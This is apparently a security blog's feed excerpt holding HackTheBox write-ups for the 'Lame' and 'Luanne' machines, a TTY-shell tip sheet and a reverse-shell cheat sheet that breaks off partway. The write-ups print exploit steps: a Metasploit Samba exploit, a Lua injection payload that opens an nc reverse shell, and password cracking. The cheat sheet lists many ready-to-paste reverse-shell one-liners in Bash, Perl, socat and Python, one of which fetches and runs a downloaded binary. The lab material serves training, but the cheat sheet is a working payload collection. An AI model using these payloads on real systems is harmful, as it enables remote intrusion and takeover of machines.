    <content type="html"><![CDATA[<span id="more"></span><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a><strong>Introduction</strong></h2><p>Lame is easy level beginner machine, Basic enumuration and exploiting the samba service which run the vuln version with RCE.</p><h2 id="Enumuration"><a href="#Enumuration" class="headerlink" title="Enumuration"></a><strong>Enumuration</strong></h2><p>Always start with the common ports scanning for the open ports.I alwaysuse nmap to scan for the open ports.Nmap reveals the open ports.</p><pre><code>#nmap -sV -oN lame.nmap 10.10.10.3 -PnHost discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 03:46 GMTNmap scan report for 10.10.10.3Host is up (0.13s latency).Not shown: 996 filtered portsPORT    STATE SERVICE     VERSION21/tcp  open  ftp         vsftpd 2.3.422/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 32.51 seconds</code></pre><h2 id="21-FTP-Exploit-Failed"><a href="#21-FTP-Exploit-Failed" class="headerlink" title="21 - FTP (Exploit Failed)"></a><strong>21 - FTP</strong> (<em>Exploit Failed</em>)</h2><p>I do some googling for is there any exploit available for the ftp version and i got the RCE exploit for the vsftpd service but it seems to be not worked for me.</p><pre><code>telnet 10.10.10.3 21Trying 10.10.10.3...Connected to 10.10.10.3.Escape character is &#39;^]&#39;.220 (vsFTPd 2.3.4)USER user:)331 Please specify the password.PASS pass#nc 10.10.10.3 6200idwhoami    #does not work</code></pre><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><p>FTP is not a way to get this machine. So i moved to the samba service which is run in the lame machine. The version of the samba server seems to be exploitable ,Because it was outdated version so i hope there is some exploit available for the version. <img src="/"></p><h2 id="Samba-user-name-map-script"><a href="#Samba-user-name-map-script" class="headerlink" title="Samba user name map script"></a><strong>Samba user name map script</strong></h2><p>I found the exploit for the samba in searchsploit.There is exploit available in metasploit</p><pre><code>$searchsploit samba 3.0----------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                       |  Path----------------------------------------------------------------------------------------------------- ---------------------------------Samba 3.0.10 (OSX) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                                 | osx/remote/16875.rbSamba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                               | multiple/remote/10095.txtSamba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)                     | unix/remote/16320.rbSamba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                   | linux/remote/9950.rbSamba 3.0.24 (Linux) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                               | linux/remote/16859.rbSamba 3.0.24 (Solaris) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                             | solaris/remote/16329.rbSamba 3.0.27a - &#39;send_mailslot()&#39; Remote Buffer Overflow                                             | linux/dos/4732.cSamba 3.0.29 (Client) - &#39;receive_smb_raw()&#39; Buffer Overflow (PoC)                                    | multiple/dos/5712.plSamba 3.0.4 - SWAT Authorisation Buffer Overflow                                                     | linux/remote/364.plSamba &lt; 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txtSamba &lt; 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txtSamba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                        | linux_x86/dos/36741.py----------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results</code></pre><p>so i used it.  <a href="https://amriunix.com/post/cve-2007-2447-samba-usermap-script/">reference link</a></p><pre><code>msf6 &gt; use multi/samba/usermap_script[*] No payload configured, defaulting to cmd/unix/reverse_netcatmsf6 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3rhost =&gt; 10.10.10.3msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.4lhost =&gt; 10.10.14.4msf6 exploit(multi/samba/usermap_script) &gt; exploit[*] Started reverse TCP handler on 10.10.14.4:4444 [*] Command shell session 1 opened (10.10.14.4:4444 -&gt; 10.10.10.3:33415) at 2021-03-17 04:00:50 +0000iduid=0(root) gid=0(root)</code></pre><p><strong><center>#Rooted this machine.</center></strong></p>]]></content>
    
    
    <summary type="html">Lame is the Easy level Hackthebox Machine.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
  </entry>
  
  <entry>
    <title>Spawning TTY Shell</title>
    <link href="https://mdn1nj4.github.io/note/spawning-tty-shell/"/>
    <id>https://mdn1nj4.github.io/note/spawning-tty-shell/</id>
    <published>2021-09-12T05:39:00.000Z</published>
    <updated>2025-05-08T07:31:28.278Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="Spawn-TTY-Shell"><a href="#Spawn-TTY-Shell" class="headerlink" title="Spawn TTY Shell"></a>Spawn TTY Shell</h2><p><strong>Attacking Machine</strong></p><pre><code>/usr/bin/script -qc /bin/bash /dev/null</code></pre><p>All that is left is to do the following:<br>A: <strong>CTRL + Z</strong> to background the shell<br>B: paste or type the following into the terminal on the attacking machine.</p><pre><code>stty raw -echo; fg; reset</code></pre><h3 id="Using-rlwrap"><a href="#Using-rlwrap" class="headerlink" title="Using rlwrap"></a>Using rlwrap</h3><p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p><pre><code>rlwrap nc 10.0.0.1 4242rlwrap -r -f . nc 10.0.0.1 4242-f . will make rlwrap use the current history file as a completion word list.-r Put all words seen on in- and output on the completion list.</code></pre><p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p><p>:warning: OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p><blockquote><p>The main problem here is that zsh doesn’t handle the stty command the same way bash or sh does. […] stty raw -echo; fg[…] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p></blockquote><pre><code>ctrl+zecho $TERM &amp;&amp; tput lines &amp;&amp; tput cols# for bashstty raw -echofg# for zshstty raw -echo; fgresetexport SHELL=bashexport TERM=xterm-256colorstty rows &lt;num&gt; columns &lt;cols&gt;</code></pre><p>or use <code>socat</code> binary to get a fully tty reverse shell</p><pre><code>socat file:`tty`,raw,echo=0 tcp-listen:12345</code></pre><h3 id="Spawn-a-TTY-shell-from-an-interpreter"><a href="#Spawn-a-TTY-shell-from-an-interpreter" class="headerlink" title="Spawn a TTY shell from an interpreter"></a>Spawn a TTY shell from an interpreter</h3><pre><code>/bin/sh -ipython3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;python3 -c &quot;__import__(&#39;pty&#39;).spawn(&#39;/bin/bash&#39;)&quot;python3 -c &quot;__import__(&#39;subprocess&#39;).call([&#39;/bin/bash&#39;])&quot;perl -e &#39;exec &quot;/bin/sh&quot;;&#39;perl: exec &quot;/bin/sh&quot;;perl -e &#39;print `/bin/bash`&#39;ruby: exec &quot;/bin/sh&quot;lua: os.execute(&#39;/bin/sh&#39;)</code></pre><ul><li>vi: <code>:!bash</code></li><li>vi: <code>:set shell=/bin/bash:shell</code></li><li>nmap: <code>!sh</code></li><li>mysql: <code>! bash</code></li></ul><h3 id="Alternative-TTY-method"><a href="#Alternative-TTY-method" class="headerlink" title="Alternative TTY method"></a>Alternative TTY method</h3><pre><code>www-data@debian:/dev/shm$ su - usersu: must be run from a terminalwww-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/nullwww-data@debian:/dev/shm$ su - userPassword: P4ssW0rDuser@debian:~$</code></pre>]]></content>
    
    
    <summary type="html">Each of the methods below is aimed to be a one-liner that you can copy/paste. As such they’re quite short lines, but not very readable.</summary>
    
    
    
    <category term="Tips" scheme="https://mdn1nj4.github.io/categories/Tips/"/>
    
    
    <category term="tips" scheme="https://mdn1nj4.github.io/tags/tips/"/>
    
    <category term="tty" scheme="https://mdn1nj4.github.io/tags/tty/"/>
    
    <category term="shell" scheme="https://mdn1nj4.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Luanne walkthrough</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-luanne-writeup/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-luanne-writeup/</id>
    <published>2021-09-12T05:38:00.000Z</published>
    <updated>2025-05-08T07:31:28.254Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Info"><a href="#Info" class="headerlink" title="Info"></a><strong>Info</strong></h1><p>Luanne is the Easy level OpenBSD machine.</p><blockquote><p>Machine created by : polarbearer</p></blockquote><h1 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a><strong>Port Scan</strong></h1><blockquote><p>$ nmap -sC -sV -p- 10.10.10.218</p></blockquote><pre><code>    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 19:18 GMT    Nmap scan report for 10.10.10.218    Host is up (0.039s latency).        PORT     STATE SERVICE VERSION    22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)    | ssh-hostkey:     |   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)    |   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)    |_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)    80/tcp   open  http    nginx 1.19.0    | http-auth:     | HTTP/1.1 401 Unauthorized\x0D    |_  Basic realm=.    | http-robots.txt: 1 disallowed entry     |_/weather    |_http-server-header: nginx/1.19.0    |_http-title: 401 Unauthorized    9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)    | http-auth:     | HTTP/1.1 401 Unauthorized\x0D    |_  Basic realm=default    |_http-server-header: Medusa/1.12    |_http-title: Error response    Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .    Nmap done: 1 IP address (1 host up) scanned in 200.98 seconds</code></pre><p>After the nmap scan there is three ports are open in the Luanne Machine</p><p><strong>22    -   SSH</strong>   OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)<br><strong>80    -   HTTP</strong>  nginx 1.19.0<br><strong>9001  -   HTTP</strong>  Medusa httpd 1.12 (Supervisor process manager)</p><h1 id="Enumuration"><a href="#Enumuration" class="headerlink" title="Enumuration"></a><strong>Enumuration</strong></h1><p>In port 80 When I try to access the web page. It asks for a username and password.<br>If I hit enter it shows the error with 401 Unauthorized.</p><p>and it reveals it running in the port 3000</p><p>127.0.0.1:3000</p><p>after reading the robots.txt I decide to open the directory</p><pre><code>curl http://10.10.10.218/robots.txtUser-agent: *Disallow: /weather  #returning 404 but still harvesting cities </code></pre><p>But &#x2F;weather is not found so I run the gobuster.</p><blockquote><p>$ gobuster dir -u <a href="http://10.10.10.218/weather/">http://10.10.10.218/weather/</a> -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</p></blockquote><pre><code>Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.10.218/weather/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Timeout:                 10s===============================================================2021/03/27 19:57:40 Starting gobuster in directory enumeration mode===============================================================/forecast             (Status: 200) [Size: 90]</code></pre><p>After the gobuster it found the directory &#x2F;weather&#x2F;forecast so let’s have a look at it.</p><p>if we want to list the cities we have pass the parameter <strong>“city&#x3D;list”</strong></p><p>it shows the list of cities.</p><p>then check the city London <strong>&#x2F;weather&#x2F;forecast?city&#x3D;london</strong></p><p>If you the pass ‘ in the city parameter <strong>&#x2F;weather&#x2F;forecast?city&#x3D;’</strong> It shows the lua error.</p><h1 id="Lua-Remote-Code-Execution"><a href="#Lua-Remote-Code-Execution" class="headerlink" title="Lua Remote Code Execution"></a><strong>Lua Remote Code Execution</strong></h1><p>After that os.execute() is used for Execute the command in lua script so I used that function.</p><p>Payload :</p><blockquote><p>‘);os.execute(‘rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1234 &gt;&#x2F;tmp&#x2F;f’)–</p></blockquote><p>we break the code script flow and inject our lua code and <strong>“–”</strong> used in lua language for comment<br>make sure to encode the payload<br>Encoded payload :</p><blockquote><p>%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201234%20%3E%2Ftmp%2Ff%27%29–</p></blockquote><p>Create listener then run the curl command</p><blockquote><p>$ curl ‘<a href="http://10.10.10.218/weather/forecast?city=%27);os.execute(%27rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E&1%7Cnc%2010.10.xx.xx%201234%20%3E/tmp/f%27)--">http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201234%20%3E%2Ftmp%2Ff%27%29--</a>‘</p></blockquote><h1 id="Getting-httpd-shell"><a href="#Getting-httpd-shell" class="headerlink" title="Getting httpd shell"></a>Getting httpd shell</h1><blockquote><p>$ nc -1vvnkp 1234</p></blockquote><pre><code>nc -lvvnkp 1234listening on [any] 1234 ...connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.218] 65471sh: can&#39;t access tty; job control turned off$ iduid=24(_httpd) gid=24(_httpd) groups=24(_httpd)$ </code></pre><p>After some enumeration, I found the <strong>.htaccess</strong> file which contains webapi_user password</p><p>copy the hash and the saves it to the file.</p><p>then crack the hash with john</p><blockquote><p>$ john hash –wordlist&#x3D;&#x2F;opt&#x2F;rockyou.txt</p></blockquote><pre><code>john hash --wordlist=/opt/rockyou.txtWarning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusiamthebest       (webapi_user)1g 0:00:00:00 DONE (2021-03-27 21:02) 5.555g/s 16533p/s 16533c/s 16533C/s secrets..lanceUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed</code></pre><p>Now i have <strong>webapi_user : iamthebest</strong></p><p>then try to login with ssh but failed!</p><p>Next webserver</p><p>Nothing interesting</p><h1 id="Getting-r-Michaels-Shell"><a href="#Getting-r-Michaels-Shell" class="headerlink" title="Getting r.Michaels Shell"></a><strong>Getting r.Michaels Shell</strong></h1><p>After some enumeration, I found the 127.0.0.1:3001 also have the same page but why</p><p>I want to check that so i run the curl command with payload</p><p>But it failed</p><pre><code>curl &#39;http://127.0.0.1:3001/weather/forecast?city=%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.6%201234%20%3E%2Ftmp%2Ff%27%29--&#39;  &#123;&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: &#39;);os.execute(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.6 1234 &gt;/tmp/f&#39;)--&quot;&#125;</code></pre><p>I does not execute it return unknown city, so I confirmed that the 3001 port server has been patched.</p><p>After reading the NetBSD httpd documentation.</p><p>I get the idea</p><blockquote><p>$ curl <a href="http://127.0.0.1:3001//~r.michaels/">http://127.0.0.1:3001/\~r.michaels/</a> -s –user “webapi_user:iamthebest”</p></blockquote><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;/&gt;&lt;style type=&quot;text/css&quot;&gt;table &#123;  border-top: 1px solid black;  border-bottom: 1px solid black;&#125;th &#123; background: aquamarine; &#125;tr:nth-child(even) &#123; background: lavender; &#125;&lt;/style&gt;&lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt;&lt;table cols=3&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align=right&gt;Size&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;../&quot;&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align=right&gt;1kB&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;id_rsa&quot;&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align=right&gt;3kB&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>It shows there is one file with the name id_rsa</p><p>r.michaels ssh key redirect to the file key in &#x2F;tmp</p><blockquote><p>$ curl <a href="http://127.0.0.1:3001//~r.michaels/id_rsa">http://127.0.0.1:3001/\~r.michaels/id_rsa</a> -s –user “webapi_user:iamthebest” &gt; &#x2F;tmp&#x2F;key</p></blockquote><blockquote><p>$ cat key | base64</p></blockquote><p>Then copy the base64 encoded</p><blockquote><p>$ echo ‘paste here ‘ | base64 -d &gt; user.key</p><p>$ chmod 600 user.key</p><p>$ ssh -i user.key <a href="mailto:&#x72;&#x2e;&#x6d;&#105;&#99;&#x68;&#97;&#101;&#x6c;&#115;&#x40;&#49;&#48;&#x2e;&#x31;&#48;&#46;&#49;&#48;&#46;&#x32;&#x31;&#x38;">&#x72;&#x2e;&#x6d;&#105;&#99;&#x68;&#97;&#101;&#x6c;&#115;&#x40;&#49;&#48;&#x2e;&#x31;&#48;&#46;&#49;&#48;&#46;&#x32;&#x31;&#x38;</a></p></blockquote><pre><code>ssh -i key r.michaels@10.10.10.218The authenticity of host &#39;10.10.10.218 (10.10.10.218)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;10.10.10.218&#39; (ECDSA) to the list of known hosts.Last login: Fri Sep 18 07:06:51 2020NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020Welcome to NetBSD!luanne$ iduid=1000(r.michaels) gid=100(users) groups=100(users)</code></pre><p><strong>User flag!</strong></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a><strong>Privilege Escalation</strong></h1><p>In &#x2F;home&#x2F;r.michaels&#x2F;backups directory found the encrypted tar file devel_backup-2020-09-16.tar.gz.enc</p><pre><code>luanne$ lltotal 4-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc</code></pre><p>In &#x2F;home&#x2F;r.michaels&#x2F;.gnupg i found two files</p><pre><code>luanne$ lspubring.gpg secring.gpgluanne$ lltotal 8-rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg-rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg</code></pre><p>So, I googled that “NetBSD gnupg”</p><p>So that two files are used by the gnupg for encrypt and decrypt. because the netpgp  is encrypt the files using the public and private keys. we have the two one is public and another one is the private key.</p><p>So let decrypt the file using the NetBSD netpgp</p><blockquote><p>$ cd &#x2F;home&#x2F;r.michaels&#x2F;backups&#x2F;</p><p>$ netpgp –decrypt –output&#x3D;&#x2F;tmp&#x2F;devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc</p></blockquote><p>Change the directory to &#x2F;tmp</p><blockquote><p>$cd &#x2F;tmp</p></blockquote><p>Unzip the tar file</p><blockquote><p>$ tar -xzf devel_backup-2020-09-16.tar.gz</p></blockquote><p>Searching for files so I used the find command to fetch the files.</p><blockquote><p>$ find . -type f</p></blockquote><pre><code>luanne$ find . -type f./www/index.html./www/.htpasswd./webapi/weather.lua</code></pre><p>we found another .htaccess file so crack</p><blockquote><p>$ cat .&#x2F;www&#x2F;.htpasswd</p></blockquote><p>copy the hash and crack with john</p><blockquote><p>$ john hash_file –wordlist&#x3D;&#x2F;opt&#x2F;rockyou.txt</p></blockquote><pre><code>john hash_file --wordlist=/opt/rockyou.txtWarning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statuslittlebear       (webapi_user)1g 0:00:00:00 DONE (2021-03-27 22:31) 4.545g/s 58909p/s 58909c/s 58909C/s tormenta..balantaUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed</code></pre><p>we crack the new password  : littlebear</p><p>After some enumuration i found the config file &#x2F;usr&#x2F;pkg&#x2F;etc&#x2F;doas.conf</p><pre><code>cat /usr/pkg/etc/doas.confpermit r.michaels as root</code></pre><p>doas - execute commands as another user. The doas utility executes the given command as another user and it is an alternative for the sudo.</p><blockquote><p>$ doas -u root &#x2F;bin&#x2F;ksh<br>password : littlebear</p></blockquote><pre><code>luanne$ doas -u root /bin/kshPassword:# iduid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)</code></pre><h3 id="–Rooted–"><a href="#–Rooted–" class="headerlink" title="–Rooted–"></a><strong>–Rooted–</strong></h3>]]></content>
    
    
    <summary type="html">Luanne is the Easy level OpenBSD machine.Basic Enumuration and lua script does not sanitize the input from user which leads to remote code execution using the os.execute() and then after some enumuration find the id_rsa key for user r.michaels then decrypt the tar backup file and get the user r.micheals password and root part is pretty simple user r.mihaels has run the commmand doas as root user that leads to migrate from user to root privilage.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="htb" scheme="https://mdn1nj4.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>Reverse shell cheat cheat</title>
    <link href="https://mdn1nj4.github.io/note/reverse-shell-cheat-cheat/"/>
    <id>https://mdn1nj4.github.io/note/reverse-shell-cheat-cheat/</id>
    <published>2021-09-12T05:38:00.000Z</published>
    <updated>2025-05-08T07:31:28.273Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><h3 id="Bash-TCP"><a href="#Bash-TCP" class="headerlink" title="Bash TCP"></a>Bash TCP</h3><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;10&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196/bin/bash -l &gt; /dev/tcp/10.0.0.1/4242 0&lt;&amp;1 2&gt;&amp;1</code></pre><h3 id="Bash-UDP"><a href="#Bash-UDP" class="headerlink" title="Bash UDP"></a>Bash UDP</h3><pre><code>Victim:sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1Listener:nc -u -lvp 4242</code></pre><p>Don’t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p><h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><pre><code>mdn1nj4@attacker$ socat file:`tty`,raw,echo=0 TCP-L:4242mdn1nj4@victim$ /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242mdn1nj4@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242</code></pre><p>Static socat binary can be found at <a href="https://github.com/andrew-d/static-binaries" title="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;NOTE: Windows onlyperl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Linux only</p><p>IPv4</p><pre><code>export RHOST=&quot;10.0.0.1&quot;;export RPORT=4242;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;python -c &#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;</code></pre><p>IPv4 (No Spaces)</p><pre><code>python -c &#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;python -c &#39;socket=__import__(&quot;socket&quot;);subprocess=__import__(&quot;subprocess&quot;);os=__import__(&quot;os&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;python -c &#39;socket=__import__(&quot;socket&quot;);subprocess=__import__(&quot;subprocess&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;</code></pre><p>IPv4 (No Spaces, Shortened)</p><pre><code>python -c &#39;a=__import__;s=a(&quot;socket&quot;);o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&quot;10.0.0.1&quot;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39;python -c &#39;a=__import__;b=a(&quot;socket&quot;);p=a(&quot;subprocess&quot;).call;o=a(&quot;os&quot;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;python -c &#39;a=__import__;b=a(&quot;socket&quot;);c=a(&quot;subprocess&quot;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));f=s.fileno;c([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=f(),stdout=f(),stderr=f())&#39;</code></pre><p>IPv4 (No Spaces, Shortened Further)</p><pre><code>python -c 